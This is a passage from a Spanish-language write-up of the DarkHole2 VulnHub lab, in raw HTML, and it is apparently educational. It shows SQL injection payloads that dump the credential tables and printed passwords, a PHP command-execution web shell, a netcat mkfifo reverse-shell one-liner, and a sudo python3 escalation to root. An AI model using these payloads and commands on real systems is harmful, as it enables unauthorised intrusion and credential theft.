480w,/images/vlh/darkhole2/22_hu5b5d3225850e30eae61377cba197da5a_51740_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/22_hu5b5d3225850e30eae61377cba197da5a_51740_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/22_hu5b5d3225850e30eae61377cba197da5a_51740_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/22_hu5b5d3225850e30eae61377cba197da5a_51740_1103x0_resize_q85_h2_lanczos_3.webp 1103w" data-sizes=auto src=/images/vlh/darkhole2/22_hu5b5d3225850e30eae61377cba197da5a_51740_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1103 height=394 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos las siguientes columnas:</p><ul><li><code>address</code></li><li><code>contact_number</code></li><li><code>email</code></li><li><code>id</code></li><li><code>password</code></li><li><code>username</code></li></ul><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,username,3,4,password,6 from darkhole_2.users-- -</span></span></span></code></pre></div></figure></div><figure><img srcset=data:image/webp;base64,UklGRjQAAABXRUJQVlA4ICgAAACwAQCdASoQAAYAAph8J6QAAudnxewAAP7OBAk30ls1jWS9Cb/uQwAA data-srcset="/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_1566x0_resize_q85_h2_lanczos_3.webp 1566w" data-sizes=auto src=/images/vlh/darkhole2/23_hudcebf5b6cb6b115265376b6ec2b1a53c_148265_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1566 height=628 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos ya las credenciales obtenidas anteriormente por los logs de <code>git</code>. Vamos a ver las columnas de la otra tabla llamada <code>ssh</code>:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=&#39;</span><span class=n>ssh</span><span class=s1>&#39; and table_schema=&#39;</span><span class=n>darkhole_2</span><span class=s1>&#39;-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRjYAAABXRUJQVlA4ICoAAACwAQCdASoQAAgAAph8J5wAAudoAeOAAP55Px8itpBUAPoLX0bgG2QAAAA=" data-srcset="/images/vlh/darkhole2/24_hu4efbedeccae7e74fc8bebc31088d86d8_108423_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/24_hu4efbedeccae7e74fc8bebc31088d86d8_108423_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/24_hu4efbedeccae7e74fc8bebc31088d86d8_108423_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/24_hu4efbedeccae7e74fc8bebc31088d86d8_108423_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/24_hu4efbedeccae7e74fc8bebc31088d86d8_108423_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/24_hu4efbedeccae7e74fc8bebc31088d86d8_108423_1395x0_resize_q85_h2_lanczos_3.webp 1395w" data-sizes=auto src=/images/vlh/darkhole2/24_hu4efbedeccae7e74fc8bebc31088d86d8_108423_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1395 height=675 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vamos a ver el contenido de esas columnas:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,group_concat(user),3,4,group_concat(pass),6 from darkhole_2.ssh-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAADQAQCdASoQAAkAAph8J6QAAudhPauAgAD+o39//klaLswidKAAAA==" data-srcset="/images/vlh/darkhole2/25_hu4cb34eb0cb2a9017836415f7784c8f64_86283_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/25_hu4cb34eb0cb2a9017836415f7784c8f64_86283_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/25_hu4cb34eb0cb2a9017836415f7784c8f64_86283_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/25_hu4cb34eb0cb2a9017836415f7784c8f64_86283_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/25_hu4cb34eb0cb2a9017836415f7784c8f64_86283_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/25_hu4cb34eb0cb2a9017836415f7784c8f64_86283_1396x0_resize_q85_h2_lanczos_3.webp 1396w" data-sizes=auto src=/images/vlh/darkhole2/25_hu4cb34eb0cb2a9017836415f7784c8f64_86283_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1396 height=765 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Tenemos la siguientes credenciales:</p><table><thead><tr><th>Username</th><th>Password</th><th>Servicio</th></tr></thead><tbody><tr><td>root</td><td>darkhole_2</td><td>mysql</td></tr><tr><td>lush@admin.com</td><td>321</td><td>login (http)</td></tr><tr><td>jehad</td><td>fool</td><td>ssh</td></tr></tbody></table><p>Vamos a probar las credenciales por SSH:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”Œâ”€â”€<span class=o>(</span>pylonã‰¿kali<span class=o>)</span>-<span class=o>[</span>~/â€¦/Vulnhub/DarkHole2/nmap/git<span class=o>]</span>
</span></span><span class=line><span class=cl>â””â”€$ ssh jehad@192.168.64.129
</span></span><span class=line><span class=cl>jehad@192.168.64.129<span class=err>&#39;</span>s password:
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-81-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Tue <span class=m>01</span> Jul <span class=m>2025</span> 06:13:39 PM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:  0.01               Processes:              <span class=m>233</span>
</span></span><span class=line><span class=cl>  Usage of /:   49.9% of 12.73GB   Users logged in:        <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage: 20%                IPv4 address <span class=k>for</span> ens33: 192.168.64.129
</span></span><span class=line><span class=cl>  Swap usage:   0%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Super-optimized <span class=k>for</span> small spaces - <span class=nb>read</span> how we shrank the memory
</span></span><span class=line><span class=cl>   footprint of MicroK8s to make it the smallest full K8s around.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   https://ubuntu.com/blog/microk8s-memory-optimisation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Fri Sep  <span class=m>3</span> 05:49:05 <span class=m>2021</span> from 192.168.135.128
</span></span><span class=line><span class=cl>jehad@darkhole:~$</span></span></code></pre></div></figure></div><h2 id=shell-as-losy>Shell as losy<a href=#shell-as-losy class=anchor aria-hidden=true>#</a></h2><p>Vamos a ver el <code>.bash_history</code> de nuestro usuario actual <code>jehad</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ cat .bash_history
</span></span><span class=line><span class=cl><span class=o>[</span>..<span class=o>]</span>
</span></span><span class=line><span class=cl>curl http://localhost:9999
</span></span><span class=line><span class=cl>curl <span class=s2>&#34;http://localhost:999/?cmd=id&#34;</span>
</span></span><span class=line><span class=cl>curl <span class=s2>&#34;http://localhost:9999/?cmd=id&#34;</span>
</span></span><span class=line><span class=cl>curl http://localhost:9999/
</span></span><span class=line><span class=cl><span class=o>[</span>..<span class=o>]</span></span></span></code></pre></div></figure></div><p>Vemos que ha realizado peticiones por <code>GET</code> al puerto <code>9999</code> que estarÃ­a corriendo en <code>localhost</code>, vamos a comprobar si sigue activo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ ss -anot
</span></span><span class=line><span class=cl>State              Recv-Q             Send-Q                          Local Address:Port                              Peer Address:Port              Process
</span></span><span class=line><span class=cl>LISTEN             <span class=m>0</span>                  <span class=m>151</span>                                 127.0.0.1:3306                                   0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN             <span class=m>0</span>                  <span class=m>4096</span>                                127.0.0.1:9999                                   0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN             <span class=m>0</span>                  <span class=m>4096</span>                            127.0.0.53%lo:53                                     0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN             <span class=m>0</span>                  <span class=m>128</span>                                   0.0.0.0:22                                     0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN             <span class=m>0</span>                  <span class=m>70</span>                                  127.0.0.1:33060                                  0.0.0.0:*
</span></span><span class=line><span class=cl>ESTAB              <span class=m>0</span>                  <span class=m>0</span>                              192.168.64.129:22                              192.168.64.128:48028              timer:<span class=o>(</span>keepalive,117min,0<span class=o>)</span>
</span></span><span class=line><span class=cl>LISTEN             <span class=m>0</span>                  <span class=m>511</span>                                         *:80                                           *:*
</span></span><span class=line><span class=cl>LISTEN             <span class=m>0</span>                  <span class=m>128</span>                                      <span class=o>[</span>::<span class=o>]</span>:22                                        <span class=o>[</span>::<span class=o>]</span>:*</span></span></code></pre></div></figure></div><p>Sigue activo, vamos a enviarle un peticiÃ³n con <code>curl</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ curl localhost:9999
</span></span><span class=line><span class=cl>Parameter GET<span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>]</span></span></span></code></pre></div></figure></div><p>Vemos que espera un parÃ¡metro por <code>GET</code> llamado <code>cmd</code>, vamos a enviarselo con un valor de un comando del sistema como <code>id</code>, ya que normalmente el parÃ¡metro <code>cmd</code> se emplea para ejecutar comandos a nivel de sistema:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ curl localhost:9999?cmd<span class=o>=</span>id
</span></span><span class=line><span class=cl>Parameter GET<span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>]</span><span class=nv>uid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span></span></span></code></pre></div></figure></div><p>Vemos que lo ejecuta como el usuario <code>losy</code>, vamos a ponernos en escucha en otra shell por ssh ya que esto corre por su <code>localhost</code> y no llegarÃ¡ a nuestra mÃ¡quina, vamos a ver si tiene <code>nc</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ nc
</span></span><span class=line><span class=cl>usage: nc <span class=o>[</span>-46CDdFhklNnrStUuvZz<span class=o>]</span> <span class=o>[</span>-I length<span class=o>]</span> <span class=o>[</span>-i interval<span class=o>]</span> <span class=o>[</span>-M ttl<span class=o>]</span>
</span></span><span class=line><span class=cl>          <span class=o>[</span>-m minttl<span class=o>]</span> <span class=o>[</span>-O length<span class=o>]</span> <span class=o>[</span>-P proxy_username<span class=o>]</span> <span class=o>[</span>-p source_port<span class=o>]</span>
</span></span><span class=line><span class=cl>          <span class=o>[</span>-q seconds<span class=o>]</span> <span class=o>[</span>-s source<span class=o>]</span> <span class=o>[</span>-T keyword<span class=o>]</span> <span class=o>[</span>-V rtable<span class=o>]</span> <span class=o>[</span>-W recvlimit<span class=o>]</span> <span class=o>[</span>-w timeout<span class=o>]</span>
</span></span><span class=line><span class=cl>          <span class=o>[</span>-X proxy_protocol<span class=o>]</span> <span class=o>[</span>-x proxy_address<span class=o>[</span>:port<span class=o>]]</span>           <span class=o>[</span>destination<span class=o>]</span> <span class=o>[</span>port<span class=o>]</span></span></span></code></pre></div></figure></div><p>Bien nos pondremos en escucha en el puerto <code>8081</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ nc -nlvp <span class=m>8081</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>8081</span></span></span></code></pre></div></figure></div><p>Ahora enviaremos la reverse shell sacada de <a href=https://www.revshells.com/>Online - Reverse Shell Generator</a>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ curl <span class=s2>&#34;http://127.0.0.1:9999/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20127.0.0.1%208081%20%3E%2Ftmp%2Ff&#34;</span></span></span></code></pre></div></figure></div><p>Ahora veremos si se estableciÃ³ conexiÃ³n:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jehad@darkhole:~$ nc -nlvp <span class=m>8081</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>8081</span>
</span></span><span class=line><span class=cl>Connection received on 127.0.0.1 <span class=m>34774</span>
</span></span><span class=line><span class=cl>sh: 0: can<span class=err>&#39;</span>t access tty<span class=p>;</span> job control turned off
</span></span><span class=line><span class=cl>$</span></span></code></pre></div></figure></div><p>Bien! Pongamos <code>whoami</code> para ver si somos <code>losy</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ whoami
</span></span><span class=line><span class=cl>losy</span></span></code></pre></div></figure></div><p>Vemos que estamos en el directorio <code>/opt/web</code> donde vemos un <code>index.php</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>losy@darkhole:/opt/web$ cat index.php
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Parameter GET[&#39;cmd&#39;]&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=o>(</span>isset<span class=o>(</span><span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>])){</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> system<span class=o>(</span><span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>?&gt;</span></span></code></pre></div></figure></div><p>AhÃ­ vemos que recoje el valor del parÃ¡metro por <code>GET</code> y ejecuta como comando del sistema con <code>system</code>.</p><h2 id=shell-as-root>Shell as root<a href=#shell-as-root class=anchor aria-hidden=true>#</a></h2><p>Vamos a ver el <code>.bash_history</code> del usuario <code>losy</code>:</p><figure><img srcset="data:image/webp;base64,UklGRiwAAABXRUJQVlA4ICAAAACwAQCdASoQAA0AAph8J6QAAveIfn4AAP7unk9WslaAAA==" data-srcset="/images/vlh/darkhole2/26_huc5199c394707a269027daebb9aec9763_172183_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/26_huc5199c394707a269027daebb9aec9763_172183_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/26_huc5199c394707a269027daebb9aec9763_172183_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/26_huc5199c394707a269027daebb9aec9763_172183_779x0_resize_q85_h2_lanczos_3.webp 779w" data-sizes=auto src=/images/vlh/darkhole2/26_huc5199c394707a269027daebb9aec9763_172183_480x0_resize_q85_bgffffff_lanczos_3.jpg width=779 height=636 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><table><thead><tr><th>Username</th><th>Password</th><th>Servicio</th></tr></thead><tbody><tr><td>root</td><td>darkhole_2</td><td>mysql</td></tr><tr><td>lush@admin.com</td><td>321</td><td>login (http)</td></tr><tr><td>jehad</td><td>fool</td><td>ssh</td></tr><tr><td>losy</td><td>gang</td><td></td></tr></tbody></table><p>Ahora vamos a hacer un <code>sudo -l</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>losy@darkhole:~$ sudo -l
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> losy:
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> losy on darkhole:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User losy may run the following commands on darkhole:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> /usr/bin/python3</span></span></code></pre></div></figure></div><p>Lo que haremos es ejecutar <code>python3</code> como <code>root</code> e importar la libreria <code>os</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>losy@darkhole:~$ sudo python3 -c <span class=s2>&#34;import os; os.system(&#39;id&#39;)&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span></span></span></code></pre></div></figure></div><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>losy@darkhole:~$ sudo python3 -c <span class=s2>&#34;import os; os.system(&#39;/bin/bash&#39;)&#34;</span>
</span></span><span class=line><span class=cl>root@darkhole:/home/losy# whoami
</span></span><span class=line><span class=cl>root</span></span></code></pre></div></figure></div><p>root! ;)</p><hr><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/thehackerslabs/jaulacon2025/ class="stretched-link text-reset text-decoration-none">JaulaCon2025</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/thehackerslabs/mortadela/ class="stretched-link text-reset text-decoration-none">Mortadela</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-md><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/privacy/>Privacy Policy</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/bootstrap.c673c84373e66019f7895efc74b3b3b940071832aaa8a85e73218087d535e71b.js integrity="sha256-xnPIQ3PmYBn3iV78dLOzuUAHGDKqqKhecyGAh9U15xs="></script><script async src=/js/app.47b84f3b640408af6efe7bf4add1a36f5b9c6227fbae7b8bcdf0c9ce42fefc54.js integrity="sha256-R7hPO2QECK9u/nv0rdGjb1ucYif7rnuLzfDJzkL+/FQ="></script><script async src=/js/flexsearch.b6f80717bc68cd38b6ded7a061f96a73896db6be17a6582f09a63a6040040919.js integrity="sha256-tvgHF7xozTi23tegYflqc4lttr4XplgvCaY6YEAECRk="></script><script async src=/js/search-modal.4e30271fef6fac86c3b4143167e9784bd3f7037ce1045d03a321e7e799e91476.js integrity="sha256-TjAnH+9vrIbDtBQxZ+l4S9P3A3zhBF0DoyHn55npFHY="></script></body></html>